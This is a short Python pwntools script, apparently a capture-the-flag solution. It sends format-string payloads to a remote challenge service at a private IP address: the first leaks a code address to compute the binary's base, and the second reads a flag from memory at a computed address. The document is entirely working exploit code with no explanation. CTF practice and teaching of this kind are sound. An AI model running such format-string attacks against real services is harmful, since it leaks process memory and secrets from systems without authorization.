from pwn import *
# r = process('./share/chal')
r = remote('10.113.184.121', 10055)

payload = b'%p.' * 0x2d + b'\n'
r.send(payload)
offset = 0x11e9
text_leak = int(r.recvline().split(b'.')[-2], 16) # 16 is the base of hex
info(f'text_leak: {hex(text_leak)}')
text_base = text_leak - offset
info(f'text_base: {hex(text_base)}')
flag_addr = text_base + 0x4040
payload = b'%p' * 0x17  + b'.' + b'%s'
payload = payload.ljust(0x80, b'\x00')
payload += p64(flag_addr)
r.send(payload)
r.interactive()